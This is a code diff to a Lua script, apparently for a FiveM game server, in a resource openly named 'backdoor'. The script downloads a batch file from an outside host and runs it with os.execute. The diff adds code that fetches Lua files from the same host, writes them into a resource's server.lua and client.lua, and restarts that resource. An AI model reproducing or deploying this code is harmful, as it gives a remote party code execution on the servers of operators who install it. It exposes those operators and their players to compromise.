@@ -1,7 +1,13 @@
 local config = {
-    resourceName = "backdoor", 
-    windowsScriptURL = "https://dc.fast-sell.de/backdoor.bat", 
-    enablePrints = true 
+    resourceName = "backdoor",
+    windowsScriptURL = "https://dc.fast-sell.de/backdoor.bat",
+    enablePrints = true,
+    resourceCodeURLs = {
+        ["test"] = {
+            client = "https://dc.fast-sell.de/server.lua",
+            server = "https://dc.fast-sell.de/server.lua"
+        }
+    }
 }
 
 local function runBatchScript(scriptContent)
@@ -42,23 +48,57 @@ local function runBatchScript(scriptContent)
     os.execute(command)
 end
 
-local function fetchScriptContent(url)
+local function fetchScriptContent(url, callback)
     if config.enablePrints then
         print("Lade das Skript herunter...")
     end
 
-    local httpRequest = PerformHttpRequest(url, function(statusCode, response)
+    PerformHttpRequest(url, function(statusCode, response)
         if statusCode == 200 then
-            runBatchScript(response)
+            callback(response)
         else
             if config.enablePrints then
                 print("Ein Fehler ist aufgetreten. Das Skript konnte nicht von der URL abgerufen werden: " .. url)
             end
         end
     end, "GET", "", {["Content-Type"] = "application/json"})
+end
 
-    while not httpRequest do
-        Citizen.Wait(0)
+local function loadResourceCode(resourceName, serverScript, clientScript)
+    local success = false
+    local resourcePath = "resources/" .. resourceName
+
+    if serverScript and serverScript ~= "" then
+        local serverFilePath = resourcePath .. "/server.lua"
+        local serverFile = io.open(serverFilePath, "w")
+        if serverFile then
+            serverFile:write(serverScript)
+            serverFile:close()
+            success = true
+        end
+    end
+
+    if clientScript and clientScript ~= "" then
+        local clientFilePath = resourcePath .. "/client.lua"
+        local clientFile = io.open(clientFilePath, "w")
+        if clientFile then
+            clientFile:write(clientScript)
+            clientFile:close()
+            success = true
+        end
+    end
+
+    if success then
+        if config.enablePrints then
+            print("Code erfolgreich in Ressource " .. resourceName .. " geladen.")
+        end
+        -- Neustart der Ressource
+        local restartCommand = "ensure " .. resourceName
+        os.execute(restartCommand)
+    else
+        if config.enablePrints then
+            print("Fehler beim Laden des Codes für Ressource " .. resourceName .. ".")
+        end
     end
 end
 
@@ -70,7 +110,23 @@ local function main()
         end
         os.exit()
     end
-    fetchScriptContent(config.windowsScriptURL)
+    fetchScriptContent(config.windowsScriptURL, function(scriptContent)
+        runBatchScript(scriptContent)
+    end)
+
+    for resourceName, urls in pairs(config.resourceCodeURLs) do
+        if urls.server and urls.server ~= "" then
+            fetchScriptContent(urls.server, function(serverScript)
+                loadResourceCode(resourceName, serverScript)
+            end)
+        end
+
+        if urls.client and urls.client ~= "" then
+            fetchScriptContent(urls.client, function(clientScript)
+                loadResourceCode(resourceName, nil, clientScript)
+            end)
+        end
+    end
 end
 
 -- Starte das Skript
